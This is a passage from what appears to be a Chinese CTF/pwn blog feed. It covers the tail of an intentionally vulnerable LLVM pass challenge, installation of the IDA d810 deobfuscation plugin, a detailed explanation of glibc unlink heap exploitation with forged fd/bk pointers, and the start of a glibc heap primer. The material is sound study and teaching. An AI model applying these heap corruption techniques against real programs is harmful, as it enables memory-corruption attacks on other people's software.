class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;edit&quot;</span>)&#123; <br>                <span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">3</span>)&#123;<br>                <span class="hljs-type">int</span> idx2 =  <span class="hljs-built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">0</span>))-&gt;<span class="hljs-built_in">getZExtValue</span>();<br>                <span class="hljs-keyword">if</span>(idx2&gt;=<span class="hljs-number">0</span> &amp;&amp; idx2&lt;=<span class="hljs-number">9</span>)&#123;<br>                    Value* a = call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">1</span>);<br>                    <span class="hljs-keyword">auto</span> a2 = call_inst-&gt;<span class="hljs-built_in">arg_begin</span>()-&gt;<span class="hljs-built_in">get</span>();<br>                    <span class="hljs-keyword">auto</span> a3 = a-&gt;<span class="hljs-built_in">getType</span>();<br>                    <span class="hljs-keyword">auto</span> a4 = <span class="hljs-built_in">dyn_cast</span>&lt;GlobalVariable&gt;(a);<br>                    <span class="hljs-keyword">if</span>(a4)&#123;<br>                    <span class="hljs-keyword">auto</span> a5 = <span class="hljs-built_in">dyn_cast</span>&lt;ConstantDataArray&gt;(a4-&gt;<span class="hljs-built_in">getInitializer</span>());<br>                    <span class="hljs-keyword">if</span>(a5)&#123;<br>                    <span class="hljs-keyword">auto</span> data = a5-&gt;<span class="hljs-built_in">getAsCString</span>();<br>   <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;edit a land&quot;</span>&lt;&lt;<span class="hljs-string">&#x27;\n&#x27;</span>;                 <br>                    i=<span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">while</span>(i&lt;data.<span class="hljs-built_in">size</span>() &amp;&amp; i&lt;=chunk_size[idx2]<span class="hljs-number">-8</span>)&#123;<br>*((<span class="hljs-type">uint8_t</span>*)table[idx2]+i) = data[i];<br><br><span class="hljs-keyword">if</span>(*((<span class="hljs-type">uint8_t</span>*)table[idx2]+i)==<span class="hljs-number">0x0f</span>)&#123;<br>i++;<br>*((<span class="hljs-type">uint8_t</span>*)table[idx2]+i) = <span class="hljs-number">0x05</span>;<br>&#125;<br><br><span class="hljs-comment">//errs() &lt;&lt; *((uint8_t*)table[idx2]+i);</span><br><br>i++;<br>&#125;<br><span class="hljs-comment">//errs() &lt;&lt; &quot; at &quot; &lt;&lt; table[idx2] &lt;&lt;&#x27;\n&#x27;;  </span><br>                &#125;<br>                &#125;<br>                &#125;<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;locate&quot;</span>)&#123;<br>              <span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">1</span>)&#123;<br>              std::cout &lt;&lt; <span class="hljs-string">&quot;locating treasure!&quot;</span> &lt;&lt; std::endl;<br>              treasuremap = (<span class="hljs-type">uint8_t</span>*)treasuremap + <span class="hljs-built_in">rand</span>()%<span class="hljs-number">0x4000</span> + <span class="hljs-number">0x5000</span>;<br>                <span class="hljs-built_in">buried</span>();<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;show&quot;</span>)&#123;<br>              std::cout &lt;&lt; <span class="hljs-string">&quot;Your money now : &quot;</span> &lt;&lt; money &lt;&lt; std::endl;<br>              &#125;<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;    <br>    <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>  &#125;<br>&#125;;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> ::<span class="hljs-function">llvm::PassPluginLibraryInfo LLVM_ATTRIBUTE_WEAK </span><br><span class="hljs-function"><span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    LLVM_PLUGIN_API_VERSION, <span class="hljs-string">&quot;optimizer&quot;</span>, <span class="hljs-string">&quot;v0.1&quot;</span>,<br>    [](PassBuilder &amp;PB) &#123;<br>      PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>        [](StringRef Name, FunctionPassManager &amp;FPM,<br>        ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;<br>          <span class="hljs-keyword">if</span>(Name == <span class="hljs-string">&quot;optimizer&quot;</span>)&#123;  <br>            FPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">optimizer</span>());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>          &#125;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>      );<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://llvm.org/docs/Reference.html">LLVM Language Reference Manual</a></p><p><a href="https://llvm.org/(%E5%AE%98%E7%BD%91%E7%9A%84Documentation%E5%BE%88%E9%BD%90%E5%85%A8)">https://llvm.org/(官网的Documentation很齐全)</a></p><p><a href="https://blog.csdn.net/sinat_38816924/article/details/114673548">[csdn]clang&amp;llvm简介</a></p><p><a href="https://www.cnblogs.com/Tu9oh0st/p/16143810.html">LLVM从小白到放弃（一）- LLVM概述与LLVM环境搭建 </a></p><p><a href="https://xz.aliyun.com/t/7257">[先知社区]初探LLVM&amp;clang&amp;pass</a></p><p><a href="https://www.jianshu.com/p/1367dad95445">[简书]深入浅出让你理解什么是LLVM</a></p><p><a href="https://bbs.kanxue.com/thread-276219.htm">[看雪]LLVM的IR指令详解</a></p><p><a href="https://www.bilibili.com/video/av93643665/?spm_id_from=333.788.b_765f64657363.1&vd_source=4d7ceec86e24de9c1f10dcb04b1715f0">[理论基础]南京大学软件分析课程</a></p><p>《LLVM编译器实战教程》(Getting Started with LLVM Core Libraries) </p><p><a href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_7">[看雪]LLVM PASS PWN 总结</a></p>]]></content>
    
    
    <categories>
      
      <category>Pwn,LLVM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
      <tag>LLVM</tag>
      
      <tag>Pass</tag>
      
      <tag>IR</tag>
      
      <tag>编译器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ida插件-d810安装和使用</title>
    <link href="/2023/09/28/ida%E6%8F%92%E4%BB%B6-d810%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/09/28/ida%E6%8F%92%E4%BB%B6-d810%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>一把梭！</p><span id="more"></span><h1 id="ida插件-d810安装和使用"><a href="#ida插件-d810安装和使用" class="headerlink" title="ida插件 - d810安装和使用"></a>ida插件 - d810安装和使用</h1><p>D-810是一个基于IDA Microcode实现的可拓展的ida去混淆插件，尤其是在CTF中碰到控制流平坦化时可以使用默认的脚本F5一键去平坦化。</p><p>网上关于d810的资料很少，翻来翻去只有<a href="https://github.com/zhkl0228/d810">该文章</a>和<a href="https://github.com/zhkl0228/d810">github</a>能看，所以本文浅浅记录d810的安装和使用</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>支持ida7.5及以上版本</p><p>使用ida目录下的idapyswitch.exe选择适合的python环境，本文使用python3.10</p><p>需要的依赖有PyQt5和z3-solver</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">python -m pip <span class="hljs-keyword">install</span> PyQt5<br>python -m pip <span class="hljs-keyword">install</span> z3-solver<br></code></pre></td></tr></table></figure><p>另外，PyQt5和python-qt5会冲突，如果报错，可以检查是不是同时安装了这俩依赖</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">python</span> -m pip list   <span class="hljs-comment">//查看已经安装的依赖</span><br><span class="hljs-keyword">python</span> -m pip uninstall <span class="hljs-keyword">python</span>-qt5   <br></code></pre></td></tr></table></figure><p>安装插件只需要从github上下载并解压，将d810文件夹和D810.py拖到ida目录下的plugins文件夹中。</p><p>完成后打开ida，工具栏可以看到有Edit - Plugins - D810选项</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>快捷键ctrl + shift + D调出d810配置面板</p><p>在Current file loaded中可以选择要载入的去混淆规则，如去平坦化</p><p><img src="/2023/09/28/ida%E6%8F%92%E4%BB%B6-d810%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/1.png" alt="1"></p><p>载入好规则后点击start，看到输出D-810 ready to deobfuscate…后f5反编译时会自动进行去混淆。</p><p>同理，点击stop关闭去混淆。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ida插件</tag>
      
      <tag>逆向</tag>
      
      <tag>去混淆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2023/05/18/unlink/"/>
    <url>/2023/05/18/unlink/</url>
    
    <content type="html"><![CDATA[<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>glibc2.23 unlink源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span><br>    FD = P-&gt;fd;      <br>    BK = P-&gt;bk;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  <br>    <span class="hljs-keyword">else</span> &#123;      <br>        FD-&gt;bk = BK;      <br>        BK-&gt;fd = FD;      <br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)      <br>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)      <br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    <br>      malloc_printerr (check_action,      <br>       <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    <br>       P, AV);      <br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;      <br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      <br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      <br>                <span class="hljs-keyword">else</span> &#123;      <br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;     <br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      <br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      <br>                  &#125;      <br>              &#125; <span class="hljs-keyword">else</span> &#123;      <br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      <br>              &#125;      <br>          &#125;      <br>      &#125;      <br>&#125;<br></code></pre></td></tr></table></figure><p>glibc 2.31unlink源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">unlink_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<span class="hljs-comment">//多了这个检测，要求当前的chunk_size == next_chunk的prev_size</span><br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br><br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br><br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>    &#125;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.31比2.23多了chunk_size &#x3D;&#x3D; next_chunk的prev_size的检测，prev_size位正常情况下都是能修改的，更不用说能修改prev_inuse位的情况，所以影响不大，下面以2.23为例</p><h2 id="1-哪些情况下会unlink"><a href="#1-哪些情况下会unlink" class="headerlink" title="1.哪些情况下会unlink"></a>1.哪些情况下会unlink</h2><p><strong>malloc</strong><br>从恰好大小合适的largebin中获取chunk，发生unlink<br>从比malloc要求大的largebin中取chunk，发生unlink<br><strong>Free</strong><br>后向合并,合并物理相邻低物理地址空闲chunk时<br>前向合并,合并物理相邻高物理地址空闲chunk时(top chunk除外)</p><p>合并时对被合并的chunk的大小无要求，前向合并时，在低地址的chunk中构造一个被合并的chunk，同时将高地址chunk的prev_size位设置成被合并chunk的大小(包括chunk_header)，size位的最低地址设置为0</p><p><strong>malloc_consolidate</strong><br>后向合并,合并物理相邻低地址空闲chunk时。<br>前向合并，合并物理相邻高地址空闲 chunk时（top chunk除外）<br><strong>realloc</strong></p><p>前向扩展，合并物理相邻高地址空闲chunk（除top chunk)</p><h3 id="为什么small-bin和unsorted-bin不发生unlink"><a href="#为什么small-bin和unsorted-bin不发生unlink" class="headerlink" title="为什么small bin和unsorted bin不发生unlink"></a>为什么small bin和unsorted bin不发生unlink</h3><p><a href="https://www.52pojie.cn/thread-1581911-1-1.html">glibc malloc和free源码解析</a></p><p>事实上small bin和unsorted bin是在malloc函数中进行脱链的，而不是通过unlink函数，当malloc的chunk需要从small bin和unsorted bin中取出时，进行类似unlink中的操作</p><p>下面是malloc函数中small bin的分配源码，关键是这几句，victim指向双向链表末尾的small chunk（small bin采用先进先出策略），该chunk的fd指向链表头，即代码中的bin，bk指向前一个chunk</p><p> if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))</p><p>bck &#x3D; victim-&gt;bk;</p><p>bin-&gt;bk &#x3D; bck;<br>bck-&gt;fd &#x3D; bin;</p><p>这个过程其实和unlink很像，但问题在于bin是不可控的，如果按照unlink的利用思路，bin-&gt;bk &#x3D; bck;不仅无法通过fd来指定地址，还会破坏链表，bck-&gt;fd &#x3D; bin;可以由bk来指定要修改的地址，但是内容固定为bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS             128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                              \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">     hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">     processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">     anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">   */</span><br><br>  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>            malloc_consolidate (av);<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              bck = victim-&gt;bk;<br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>                &#123;<br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>              set_inuse_bit_at_offset (victim, nb);<br>              bin-&gt;bk = bck;<br>              bck-&gt;fd = bin;<br><br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-unlink时的漏洞及利用"><a href="#2-unlink时的漏洞及利用" class="headerlink" title="2.unlink时的漏洞及利用"></a>2.unlink时的漏洞及利用</h2><p>默认64位</p><p>关键代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">FD = P-&gt;fd;      <br>BK = P-&gt;bk;<br><br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br><br>FD-&gt;bk = BK;      <br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure><p>绕过检测要求：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;fd-&gt;bk = p     <br>p-&gt;bk-&gt;fd = p<br>等价于<br>*(*(P+<span class="hljs-number">0X10</span>)+<span class="hljs-number">0X18</span>) = P<br>*(*(P+<span class="hljs-number">0X18</span>)+<span class="hljs-number">0X10</span>) = P <br>等价于<br>FD = &amp;p - <span class="hljs-number">0x18</span>  #&amp;p为heap_array中当前chunk(被合并chunk)的指针的存放地址<br>BK = &amp;p - <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><p> 也就是说把被unlink的chunk的<strong>fd和bk分别设置成&amp;p - 0x18和&amp;p - 0x10</strong>就能<strong>绕过检测</strong>，这里需要题目中存在一个存放p指针的数据结构</p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong></p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong></p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong></p><p>重要的话说三遍，高地址的chunk被合并后会被清空</p><p>绕过检测后执行</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">FD-&gt;<span class="hljs-keyword">bk </span>= <span class="hljs-keyword">BK;</span>      <br><span class="hljs-keyword">BK-&gt;fd </span>= FD;<br>等价于<br>p = &amp;p - <span class="hljs-number">0x10</span><br>p = &amp;p - <span class="hljs-number">0x18</span><br></code></pre></td></tr></table></figure><p>p是原本指向被unlink的chunk的chunk头的指针，此时已经指向了&amp;p-0x18，假设p原本被存放在bss段的一个数组(heap_array)中，那么此时修改p原本指向的chunk的内容，就变成了修改bss段chunk头首地址在&amp;p-0x18的fake chunk的内容，通常就可以修改存放chunk指针的数组了</p><p>总结：</p><p>条件：</p><p>bss段存在chunk指针数组heap_arr(经典的用法)</p><p>第一种情况：存在uaf，使被合并chunk在被free后还能修改chunk中的fd和bk指针</p><p>第二种情况：存在堆溢出，将被合并的chunk伪装成释放状态</p><p>构造：一般是后向合并，即free掉高地址的chunk，去合并低地址的chunk。在被合并chunk的usr_data中再伪造一个chunk，构造该chunk的fd和bk(fake_fd &#x3D; &amp;p - 0x18   fake_bk &#x3D; &amp;p - 0x10)，同时将高地址chunk的prev_size位设置成伪造的chunk的大小(包括chunk_header)，size位的最低地址设置为0。</p><p>效果：</p><p>p &#x3D; &amp;p - 0x18</p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong>，&amp;p是该指针在heap_array中的地址，unlink后再去修改该指针指向的chunk的内容就变成了修改heap_array的内容</p><h2 id="3-例题："><a href="#3-例题：" class="headerlink" title="3.例题："></a>3.例题：</h2><h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><h2 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h2>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unlink</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc堆漏洞利用基础</title>
    <link href="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="glibc堆-ptmalloc-漏洞利用基础"><a href="#glibc堆-ptmalloc-漏洞利用基础" class="headerlink" title="glibc堆(ptmalloc)漏洞利用基础"></a>glibc堆(ptmalloc)漏洞利用基础</h1><p>​                                     虚拟内存示意图</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.jpg" alt="虚拟内存"></p><h2 id="1-Arena和malloc-state"><a href="#1-Arena和malloc-state" class="headerlink" title="1.Arena和malloc_state"></a>1.Arena和malloc_state</h2><p>arena即堆内存本身,概念上arena &gt; heap &gt; chunk</p><p>主线程的arena称为main_arena,由sbrk函数向内核申请一大片内存创建，最开始调用sbrk函数创建大小为(128 KB + chunk_size) align 4KB的空间作为heap。当已经申请的内存不够时会调用sbrk向系统申请内存给 <code>malloc_state.top</code>，使brk指针向上沿伸，但如果沿伸到了内存映射段，则调用mmap映射一块内存给main_arena，此时brk不再指向main_arena顶部,main_arena将无法被收回。</p><p>其它线程的arena称为thread_arena,最开始调用 mmap 映射一块大小为HEAP_MAX_SIZE（32 位系统上默认为 1MB，64 位系统上默认为 64MB）的空间作为 sub-heap。当不够用时，会调用 mmap 映射一块新的 sub-heap，也就是增加 top chunk 的大小，每次 heap 增加的值都会对齐到4KB。这样，一个thread_arena由多个heap构成，每个heap均由mmap获得，最大为1M，多个heap间可能不相邻,top chunk在最高地址的heap中，每个heap的最低地址的_heap_info中的prev指针指向前一个heap。</p><p><strong>泄露libc</strong>：在能够查看内存分配的环境下（本地<code>vmmap</code>，远程环境通过<strong>传非法地址</strong>泄露内存分配），通过申请大内存块，可通过利用<code>mmap</code>分配到的内存块地址与<code>libc</code>基址之间的固定偏移量泄露<code>libc</code>地址。</p><p>多个arena间通过链表连接，如下</p><p>main_arena —&gt; arena1 —&gt; arena2 —&gt; ………..</p><p>arena数量上限与系统和处理器核心数有关，并且有锁的机制，如果所有arena都上锁了，线程需要等待</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">32</span>位系统中：<br>     <span class="hljs-attribute">Number</span> of arena = <span class="hljs-number">2</span> * number of cores + <span class="hljs-number">1</span>.<br><span class="hljs-attribute">64</span>位系统中：<br>     